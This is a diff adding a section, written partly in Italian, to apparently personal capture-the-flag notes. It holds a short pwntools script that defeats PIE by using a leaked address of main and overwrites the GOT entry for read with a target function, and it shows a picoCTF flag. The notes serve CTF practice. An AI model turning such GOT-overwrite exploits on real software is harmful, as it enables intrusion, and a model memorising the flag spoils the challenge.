@@ -44,6 +44,23 @@ RELRO     : Partial
     p.interactive()
     =>picoCTF{A_s0ng_0f_1C3_and_f1r3_e122890e}
 
+3)challenge
+  This is a position-independent binary!!!!!
+  In questa challenge il PIE è attivo; perciò la posizione della base ed ogni indirizzo cambiano ad ogni esecuzione. Perciò bisogna:
+  
+  from pwn import *
+  p=process('./challenge')
+  e=ELF('./challenge')
+  main=p.unpack()
+  e.address= main - e.symbols['main'] #indirizzo di base
+  rimp= e.got['read']
+  target=e.symbols['oh_look_useful']
+  p.pack(rimp)
+  p.pack(target)
+  p.interactive()
+
+
+
 
 
 
